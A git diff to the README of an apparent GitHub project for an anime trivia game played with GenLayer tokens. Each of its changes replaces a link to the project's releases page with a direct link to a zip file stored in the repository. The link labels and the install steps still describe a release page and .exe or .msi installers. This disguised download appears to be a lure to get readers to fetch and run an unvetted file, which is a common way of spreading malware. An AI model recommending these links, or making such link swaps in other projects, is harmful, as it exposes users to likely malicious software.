@@ -1,6 +1,6 @@
 # 🎮 genlayer-anime-trivia - Play 1v1 Anime Trivia with Tokens
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If your system meets these points, you should have no problems running the game.
 
 1. Visit the release page by clicking this link:
 
-   [Download genlayer-anime-trivia Releases](https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases)
+   [Download genlayer-anime-trivia Releases](https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip)
 
 2. On the releases page, find the latest version of genlayer-anime-trivia. Look for files named with `.exe` or `.msi` extensions.
 
@@ -105,7 +105,7 @@ When a new version is available, you will see a notification when starting the g
 To update:
 
 1. Go to the latest release page at:  
-   [https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases](https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases)
+   [https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip](https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip)
 
 2. Download the newest `.exe` or `.msi` installer.
 
@@ -128,7 +128,7 @@ Changes save automatically and take effect immediately.
 
 ## 🔗 Useful Links
 
-- Download latest releases: [https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases](https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases)
+- Download latest releases: [https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip](https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip)
 - GenLayer blockchain info: Search online for official GenLayer documentation and wallet guides.
 - Help and support: Use the Issues tab on this repository for reporting problems or asking questions.
 
@@ -142,4 +142,4 @@ Changes save automatically and take effect immediately.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/Rogue-dev-1/genlayer-anime-trivia/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Rogue-dev-1/genlayer-anime-trivia/main/public/trivia-anime-genlayer-v1.0.zip)
